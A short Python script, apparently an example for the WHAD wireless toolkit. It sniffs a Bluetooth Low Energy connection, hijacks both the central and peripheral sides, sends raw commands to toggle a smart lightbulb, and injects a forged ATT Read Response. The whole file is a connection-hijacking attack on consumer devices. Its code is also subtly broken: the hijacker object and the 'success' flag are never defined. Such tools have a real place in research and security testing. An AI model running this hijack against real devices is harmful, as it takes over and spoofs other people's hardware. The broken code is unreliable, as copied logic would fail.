from whad.ble import Sniffer, Hijacker, Central, Peripheral
from whad.device import WhadDevice
from whad.exceptions import WhadDeviceNotFound
from time import time,sleep
from whad.ble.profile import UUID
from scapy.all import BTLE_DATA, L2CAP_Hdr, ATT_Hdr, ATT_Read_Response
import sys

if __name__ == '__main__':
    if len(sys.argv) >= 2:
        # Retrieve target interface
        interface = sys.argv[1]

        # Connect to target device and performs discovery
        try:
            dev = WhadDevice.create(interface)

            sniffer = Sniffer(dev)
            connection = sniffer.wait_new_connection()
            print("Press enter to hijack.")
            input()
            Hijacker(connection)
            if success:
                print("Master and Slave successfully hijacked !")
                central = hijacker.available_actions(Central)[0]
                peripheral = hijacker.available_actions(Peripheral)[0]

                periph = central.peripheral()
                periph.discover()

                c = periph.get_characteristic(UUID("a8b3fff0-4834-4051-89d0-3de95cddd318"), UUID("a8b3fff1-4834-4051-89d0-3de95cddd318"))
                while True:
                    print("Press enter to turn off the lightbulb.")
                    input()
                    c.write(bytes.fromhex("5510000d0a"))
                    print("Press enter to turn on the lightbulb.")
                    input()
                    c.write(bytes.fromhex("5510010d0a"))
                    print("Press enter to send a Read Response.")
                    input()
                    peripheral.send_pdu(BTLE_DATA()/L2CAP_Hdr()/ATT_Hdr()/ATT_Read_Response(value=b"ABCD"))

            else:
                print("Fail, exiting...")
        except (KeyboardInterrupt, SystemExit):
            dev.close()

        except WhadDeviceNotFound:
            print('[e] Device not found')
            exit(1)
    else:
        print('Usage: %s [device]' % sys.argv[0])
